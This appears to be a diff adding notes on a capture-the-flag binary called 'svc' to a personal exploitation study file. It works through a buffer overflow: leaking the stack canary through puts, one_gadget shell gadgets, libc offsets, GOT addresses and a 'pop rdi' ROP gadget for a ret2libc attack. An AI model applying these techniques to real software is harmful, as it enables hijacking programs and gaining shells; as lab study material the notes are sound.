@@ -194,6 +194,77 @@
 
     Interesting to note that pwn contains facilities to open libraries (here `libc-2.31.so`) so we can compute the delta in the library in case it has RELRO enabled.
 
+* svc
+
+    64 bit LSB, dynamically linked. Canary, NX and ASLR.
+
+    prgm takes input from user to select an option. When selecting option 1, we are able to write 0xf8 bytes into a 0xa8 buffer.
+
+    There is a canary check at the end of the program, if we fail it we go into `__stack_chk_fail()`. To overcome it we will leak it with the call to `puts`, which stops at the first null byte. So we will only overwrite the last 0s of the canary to see it. So we give it 0xa9 zeroes, and select the second option to see the canary.
+
+    Stack is at `0x00007fffffffdc40`
+    rip at `0x7fffffffdcf8`
+    -> 0xb8 of delta
+
+    Linked with `libgcc_s.so.1`, `libm-2.31.so`, `libc-2.31.so`, `libstdc++.so.6.0.28` and `ld-2.31.so`. We'll look at `libc-2.31.so`.
+
+    gadgets with `one_gadget` command:
+    ```
+    0xe6c7e execve("/bin/sh", r15, r12)
+    constraints:
+    [r15] == NULL || r15 == NULL
+    [r12] == NULL || r12 == NULL
+
+    0xe6c81 execve("/bin/sh", r15, rdx)
+    constraints:
+    [r15] == NULL || r15 == NULL
+    [rdx] == NULL || rdx == NULL
+
+    0xe6c84 execve("/bin/sh", rsi, rdx)
+    constraints:
+    [rsi] == NULL || rsi == NULL
+    [rdx] == NULL || rdx == NULL
+    ```
+
+    Or as suggested in the tutorial, compute different offsets to different part of the exploit:
+    ```
+    libc base (`vmmap`):                    0x7ffff7bdf000
+    puts (`p puts`):                        0x7ffff7c665a0
+    system (`p system`):                    0x7ffff7c34410
+    /bin/bash (`search-pattern /bin/bash`): 0x7ffff7d965aa
+
+    offsetPuts: 0x7ffff7c665a0 - 0x7ffff7bdf000  = 0x875a0
+    offsetSystem: 0x7ffff7c34410 - 0x7ffff7bdf000 = 0x55410
+    offsetBinSh: 0x7ffff7d965aa - 0x7ffff7bdf000 = 0x1b75aa
+    ```
+
+
+    Since ASLR is enabled, we'll need to leak a libc method address, to compute the "real" address of the gadget. We'll use `puts` for that, by displaying the address of itself. Since PIE is disabled, we can look at the GOT table to look for the pointer to `puts`, since its address is not randomized.
+
+    We can use pwn to get the addresses:
+    ```
+    from pwn import *
+    elf = ELF('svc')
+    hex(elf.symbols['puts']) # 0x4008d0
+    hex(elf.got['puts']) # 0x602018
+    ```
+
+    Or on ghidra, look at the `PTR_puts_xxxxx` entry in the .got.plt table:
+    ```
+                        PTR_puts_00602018   XREF[1]:     puts:004008d0  
+    00602018 10 30 60   addr       puts
+             00 00 00 
+             00 00
+    ```
+
+    We'll just need a gadget to set rdi, since it is used by `puts`:
+    ```bash
+    $ ROPgadget --binary svc | grep "pop rdi"
+    0x0000000000400ea3 : pop rdi ; ret
+    ```
+
+
+
 
 # Notes
 
